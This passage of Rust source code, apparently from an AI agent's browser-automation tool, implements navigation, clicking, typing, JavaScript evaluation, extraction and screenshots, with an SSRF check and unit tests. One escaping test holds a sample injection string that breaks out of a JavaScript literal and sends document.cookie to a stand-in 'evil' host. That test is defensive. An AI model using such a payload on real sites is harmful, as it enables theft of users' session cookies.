    const DESCRIPTION: &'static str = "Controls a browser to render JS pages, interact with DOM elements, evaluate JavaScript, extract structured data via CSS selectors, and capture screenshots. Uses chromedriver (WebDriver) by default, or attaches to a running Chrome via CDP when browser.backend is set to cdp in config.toml. Runs with a visible window by default; set browser.headless = true in config.toml (or pass headless: true) for headless mode.";
    type Args = BrowserArgs;

    async fn execute(args: Self::Args, ctx: &ToolContext) -> Result<String> {
        let reg = BrowserRegistry::global();
        let wait_secs = args.wait_secs.unwrap_or(DEFAULT_WAIT_SECS).clamp(1, 60);
        let backend_type =
            BackendType::resolve(&ctx.config.browser.backend, ctx.config.browser.cdp_port);
        let default_headless = resolve_headless_default(ctx.config.browser.headless);

        match args.action {
            BrowserAction::Close => reg.close().await,

            BrowserAction::Status => Ok(reg.status().await),

            BrowserAction::Goto => {
                let raw_url = args
                    .url
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'url' is required for browser:goto")?;

                let parsed =
                    Url::parse(raw_url).with_context(|| format!("Invalid URL: '{raw_url}'"))?;

                let policy = SsrfPolicy::from_config(
                    ctx.config.app.http_allow_private,
                    &ctx.config.app.http_allowed_cidrs,
                );
                validate_public_url(&parsed, &policy).await?;

                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                backend.goto(parsed.as_str()).await?;

                if let Some(sel) = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                {
                    backend
                        .wait_for_selector(sel, Duration::from_secs(wait_secs))
                        .await?;
                }

                let final_url = backend.current_url().await?;
                let title = backend.title().await.unwrap_or_default();
                let mode = if reg.headless_mode().await {
                    "[headless]"
                } else {
                    "[visible]"
                };
                Ok(format!("Navigated to: {final_url}\nTitle: {title} {mode}"))
            }

            BrowserAction::Read => {
                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty());
                let text = if let Some(s) = sel {
                    backend
                        .read_selector_text(s, Duration::from_secs(wait_secs))
                        .await?
                } else {
                    backend.read_page_text().await?
                };
                let url = backend.current_url().await.unwrap_or_default();
                let title = backend.title().await.unwrap_or_default();
                Ok(format!("URL: {url}\nTitle: {title}\n\n{}", text.trim()))
            }

            BrowserAction::Click => {
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'selector' is required for browser:click")?;
                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                backend.click(sel, Duration::from_secs(wait_secs)).await?;
                let url = backend.current_url().await.unwrap_or_default();
                Ok(format!("Clicked '{sel}'. Current URL: {url}"))
            }

            BrowserAction::Type => {
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'selector' is required for browser:type")?;
                let text = args
                    .text
                    .as_deref()
                    .context("'text' is required for browser:type")?;
                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                backend
                    .type_text(sel, text, args.clear, Duration::from_secs(wait_secs))
                    .await?;
                Ok(format!(
                    "Typed {} chars into '{sel}'.",
                    text.chars().count()
                ))
            }

            BrowserAction::Eval => {
                let script = args
                    .script
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'script' is required for browser:eval")?;
                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                let result = backend.evaluate(script).await?;
                Ok(serde_json::to_string_pretty(&result)?)
            }

            BrowserAction::Extract => {
                let selector = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("'selector' is required for browser:extract")?;
                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                let source = backend.get_outer_html().await?;
                let result = extract_from_html(&source, selector)?;
                Ok(serde_json::to_string_pretty(&result)?)
            }

            BrowserAction::Screenshot => {
                let backend = reg
                    .get_or_init(args.headless, default_headless, &backend_type)
                    .await?;
                let sel = args
                    .selector
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty());
                let png = backend
                    .screenshot(sel, Duration::from_secs(wait_secs))
                    .await?;

                let out_path: PathBuf = match args
                    .path
                    .as_deref()
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                {
                    Some(rel) => ctx.resolve_new_path(rel)?,
                    None => std::env::temp_dir().join(format!(
                        "archon-screenshot-{}.png",
                        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
                    )),
                };
                if let Some(parent) = out_path.parent() {
                    std::fs::create_dir_all(parent)?;
                }
                std::fs::write(&out_path, &png).with_context(|| {
                    format!("Failed to write screenshot to {}", out_path.display())
                })?;

                Ok(format!(
                    "Saved screenshot ({} bytes) to {}",
                    png.len(),
                    out_path.display()
                ))
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ensure_return_prepends_bare_expression() {
        assert_eq!(ensure_return("document.title"), "return document.title");
    }

    #[test]
    fn ensure_return_keeps_existing_return() {
        assert_eq!(
            ensure_return("return document.title"),
            "return document.title"
        );
    }

    #[test]
    fn ensure_return_handles_multiline_with_return() {
        let script = "let el = document.body;\nreturn el.textContent;";
        assert_eq!(ensure_return(script), script);
    }

    #[test]
    fn ensure_return_detects_return_after_semicolon() {
        assert_eq!(
            ensure_return("let x = 1; return x;"),
            "let x = 1; return x;"
        );
    }

    #[test]
    fn ensure_return_detects_return_inside_block() {
        let script = "if (true) { return 'yes'; }";
        assert_eq!(ensure_return(script), script);
    }

    #[test]
    fn ensure_return_false_positive_css_selector() {
        // This should NOT be treated as having a return statement.
        let script = "document.querySelector('.return-btn').textContent";
        assert_eq!(
            ensure_return(script),
            "return document.querySelector('.return-btn').textContent"
        );
    }

    #[test]
    fn ensure_return_false_positive_variable_name() {
        let script = "return_value";
        // 'return_value' is a single identifier, not a return statement.
        assert_eq!(ensure_return(script), "return return_value");
    }

    #[test]
    fn ensure_return_handles_return_semicolon_only() {
        assert_eq!(ensure_return("return;"), "return;");
    }

    #[test]
    fn has_return_statement_negative_cases() {
        assert!(!has_return_statement(
            "document.querySelector('.return-btn')"
        ));
        assert!(!has_return_statement("let returnCount = 0;"));
        assert!(!has_return_statement("el.setAttribute('data-return', '1')"));
    }

    #[test]
    fn has_return_statement_positive_cases() {
        assert!(has_return_statement("return 42;"));
        assert!(has_return_statement("return 42"));
        assert!(has_return_statement("let x = 1; return x;"));
        assert!(has_return_statement("{ return 'a'; }"));
        assert!(has_return_statement("if (x) return y; else return z;"));
    }

    #[test]
    fn ensure_return_fixes_callback_false_positive() {
        // A `return` inside a callback must not suppress the top-level `return`
        // (this is the real-world bug that produced `null` from
        // `[1,2,3].map(function (x) { return x * 2; }).length`).
        assert_eq!(
            ensure_return("[1,2,3].map(function (x) { return x * 2; }).length"),
            "return [1,2,3].map(function (x) { return x * 2; }).length"
        );
    }

    #[test]
    fn ensure_return_fixes_arrow_callback_false_positive() {
        assert_eq!(
            ensure_return("[1,2,3].map((x) => x * 2).length"),
            "return [1,2,3].map((x) => x * 2).length"
        );
    }

    #[test]
    fn has_return_statement_ignores_callback_return() {
        assert!(!has_return_statement(
            "[1,2,3].map(function (x) { return x; }).length"
        ));
        assert!(!has_return_statement(
            "[1,2,3].forEach(function (x) { return; })"
        ));
        assert!(!has_return_statement(
            "JSON.stringify({ fn: function () { return 1; } })"
        ));
    }

    #[test]
    fn has_return_statement_ignores_string_and_comment_return() {
        assert!(!has_return_statement("JSON.stringify({ s: 'return 1' })"));
        assert!(!has_return_statement("// return 1\ndocument.title"));
        assert!(!has_return_statement("/* return 1 */\ndocument.title"));
    }

    #[test]
    fn has_return_statement_allows_top_level_return_after_block() {
        // The second `return` is top-level (depth 0); the first is inside the
        // block and is correctly ignored.
        assert!(has_return_statement("if (x) { return 1; } return 2;"));
    }

    #[test]
    fn extract_from_html_pulls_text_and_attrs() {
        let html =
            r#"<html><body><article class="post" id="a1"><h2>Title A</h2></article></body></html>"#;
        let out = extract_from_html(html, "article.post h2").unwrap();
        let items = out["items"].as_array().expect("items array");
        assert_eq!(items.len(), 1);
        assert_eq!(items[0]["text"], "Title A");
        assert_eq!(out["count"], 1);
        assert_eq!(out["truncated"], false);
    }

    #[test]
    fn extract_from_html_follows_descendant_anchor_href() {
        let html = r#"<ul><li data-id="7"><a href="/doc/7">Read</a></li></ul>"#;
        let out = extract_from_html(html, "li").unwrap();
        let item = &out["items"][0];
        assert_eq!(item["attrs"]["data-id"], "7");
        assert_eq!(item["href"], "/doc/7");
        assert_eq!(item["text"], "Read");
    }

    #[test]
    fn extract_from_html_prefers_own_href() {
        let html = r#"<a class="link" href="/self">link <a href="/child">nested</a></a>"#;
        let out = extract_from_html(html, "a.link").unwrap();
        assert_eq!(out["items"][0]["href"], "/self");
    }

    #[test]
    fn extract_from_html_invalid_selector_errors() {
        // A leading combinator (no left-hand compound) is invalid CSS.
        assert!(extract_from_html("<html></html>", "> div").is_err());
    }

    #[test]
    fn extract_from_html_truncates_over_max() {
        let html = format!(
            "<ul>{}</ul>",
            std::iter::repeat_n("<li>x</li>", 220).collect::<String>()
        );
        let out = extract_from_html(&html, "li").unwrap();
        assert_eq!(out["count"], 200);
        assert_eq!(out["truncated"], true);
    }

    #[test]
    fn browser_args_deserialization() {
        let json = r#"{"action":"goto","url":"https://example.com","wait_secs":5}"#;
        let args: BrowserArgs = serde_json::from_str(json).unwrap();
        assert!(matches!(args.action, BrowserAction::Goto));
        assert_eq!(args.url.as_deref(), Some("https://example.com"));
        assert_eq!(args.wait_secs, Some(5));
    }

    #[test]
    fn browser_args_defaults() {
        let json = r#"{"action":"status"}"#;
        let args: BrowserArgs = serde_json::from_str(json).unwrap();
        assert!(matches!(args.action, BrowserAction::Status));
        assert_eq!(args.url, None);
        assert!(args.clear, "clear should default to true");
        assert!(
            args.headless.is_none(),
            "headless should default to None (sticky)"
        );
    }

    #[test]
    fn browser_args_headless_false() {
        let json = r#"{"action":"goto","url":"https://example.com","headless":false}"#;
        let args: BrowserArgs = serde_json::from_str(json).unwrap();
        assert_eq!(
            args.headless,
            Some(false),
            "headless should be Some(false) when explicitly set"
        );
    }

    // ── js_str escaping tests ──────────────────────────────────────────────

    #[test]
    fn js_str_escapes_double_quotes() {
        assert_eq!(js_str("say \"hi\""), "\"say \\\"hi\\\"\"");
    }

    #[test]
    fn js_str_escapes_backslash() {
        assert_eq!(js_str(r"C:\path"), "\"C:\\\\path\"");
    }

    #[test]
    fn js_str_escapes_newline() {
        assert_eq!(js_str("a\nb"), "\"a\\nb\"");
    }

    #[test]
    fn js_str_round_trips_injection_payload() {
        let malicious = r#"'); fetch('https://evil/?c='+document.cookie);//"#;
        let encoded = js_str(malicious);
        // Must be a single valid JSON string literal.
        let decoded: &str = serde_json::from_str(&encoded).unwrap();
        assert_eq!(decoded, malicious);
        // No unescaped single-quote followed by `)` (the old break-out vector).
        assert!(encoded.starts_with('"') && encoded.ends_with('"'));
    }

    #[test]
    fn js_str_normal_selector() {
        assert_eq!(js_str("#login-btn"), "\"#login-btn\"");
    }

    // ── CDP evaluate IIFE-wrapping tests ──────────────────────────────────
    // Verifies the has_return_statement predicate that decides IIFE wrapping.

    #[test]
    fn cdp_evaluate_no_wrap_for_bare_expression() {
        assert!(!has_return_statement("document.title"));
    }

    #[test]
    fn cdp_evaluate_wrap_for_top_level_return() {
        assert!(has_return_statement(
            "let items = document.querySelectorAll('li'); return items.length;"
        ));
    }

    #[test]
    fn cdp_evaluate_no_wrap_for_callback_return() {
        assert!(!has_return_statement("[1,2,3].map((x) => x * 2).length"));
    }

    // ── CDP integration test ──────────────────────────────────────────────
    // Requires Chrome installed. Run with:
    //   cargo test cdp_backend_full_lifecycle -- --ignored

    fn find_chrome_binary() -> Option<PathBuf> {
        if let Ok(p) = std::env::var("CHROME_BIN") {
            let path = PathBuf::from(p);
            if path.exists() {
                return Some(path);
            }
        }
        for name in [
            "google-chrome",
            "google-chrome-stable",
            "chromium",
            "chromium-browser",
        ] {
            for dir in ["/usr/bin", "/usr/local/bin"] {
                let path = PathBuf::from(dir).join(name);
                if path.exists() {
                    return Some(path);
                }
            }
        }
        None
    }

    #[tokio::test]
    #[ignore = "requires Chrome browser installed; run with --ignored"]
    async fn cdp_backend_full_lifecycle() {
        let chrome = find_chrome_binary()
            .expect("Chrome not found. Set CHROME_BIN=/path/to/chrome or install google-chrome.");

        // Pick a random available port.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener);

        // Spawn headless Chrome with CDP enabled.
        let mut chrome_proc = tokio::process::Command::new(&chrome)
            .arg("--headless")
            .arg(format!("--remote-debugging-port={port}"))
            .arg("--no-sandbox")
            .arg("--disable-gpu")
            .arg("--window-size=1280,720")
            .arg("about:blank")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn Chrome");

        // Wait for the CDP endpoint to be ready.
        let targets_url = format!("http://127.0.0.1:{port}/json");
        let mut ready = false;
        for _ in 0..50 {
            if reqwest::get(&targets_url)
                .await
                .map(|r| r.status().is_success())
                .unwrap_or(false)
            {
                ready = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
        assert!(ready, "CDP endpoint not ready within 10s");

        // Connect via CdpBackend.
        let backend = CdpBackend::connect(port)
            .await
            .expect("CdpBackend::connect failed");

        // Navigate to a data URL (no network needed).
        let page = "data:text/html,<html><head><title>CDP Test Page</title></head><body><h1>Hello CDP</h1><p id='para'>Test paragraph text</p><button id='btn'>Click me</button><input id='inp' type='text' value='initial'></body></html>";
        backend.goto(page).await.expect("goto failed");

        // title
        let title = backend.title().await.expect("title failed");
        assert!(title.contains("CDP Test Page"), "title: {title}");

        // current_url
        let current = backend.current_url().await.expect("current_url failed");
        assert!(current.starts_with("data:"), "url: {current}");

        // read_page_text
        let text = backend
            .read_page_text()
            .await
            .expect("read_page_text failed");
        assert!(text.contains("Hello CDP"), "page text: {text}");
        assert!(text.contains("Test paragraph text"), "page text: {text}");

        // read_selector_text
        let para = backend
            .read_selector_text("#para", Duration::from_secs(3))
            .await
            .expect("read_selector_text failed");
        assert_eq!(para.trim(), "Test paragraph text");

        // evaluate
        let val = backend.evaluate("2 + 3").await.expect("evaluate failed");
        assert_eq!(val, serde_json::json!(5));

        // get_outer_html + extract_from_html
        let html = backend
            .get_outer_html()
            .await
            .expect("get_outer_html failed");
        assert!(
            html.contains("Hello CDP"),
            "outerHTML should contain page content"
        );
        let extracted = extract_from_html(&html, "h1").expect("extract failed");
        assert_eq!(extracted["count"], 1);
        assert_eq!(extracted["items"][0]["text"], "Hello CDP");

        // type_text (clear + type)
        backend
            .type_text("#inp", "hello world", true, Duration::from_secs(3))
            .await
            .expect("type_text failed");
        let inp_val = backend
            .evaluate("document.querySelector('#inp').value")
            .await
            .expect("read input value failed");
        assert_eq!(inp_val, serde_json::json!("hello world"));

        // screenshot (viewport)
        let png = backend
            .screenshot(None, Duration::from_secs(5))
            .await
            .expect("screenshot failed");
        assert!(png.len() > 1000, "PNG too small: {} bytes", png.len());
        assert!(
            png.starts_with(&[0x89, 0x50, 0x4E, 0x47]),
            "screenshot is not a PNG"
        );

        // screenshot (element)
        let el_png = backend
            .screenshot(Some("h1"), Duration::from_secs(5))
            .await
            .expect("element screenshot failed");
        assert!(
            el_png.len() > 100,
            "element PNG too small: {} bytes",
            el_png.len()
        );

        // is_alive
        assert!(backend.is_alive().await, "backend should be alive");

        // label
        let label = backend.label();
        assert!(
            label.contains("CDP"),
            "label should mention CDP, got: {label}"
        );

        // close (should NOT kill Chrome)
        backend.close().await.expect("close failed");

        // Verify Chrome is still running (CDP close doesn't kill the browser).
        let still_up = reqwest::get(&targets_url)
            .await
            .map(|r| r.status().is_success())
            .unwrap_or(false);
        assert!(still_up, "Chrome should still be running after CDP close");

        // Cleanup: kill the spawned Chrome.
        chrome_proc.kill().await.ok();
        chrome_proc.wait().await.ok();
    }
}
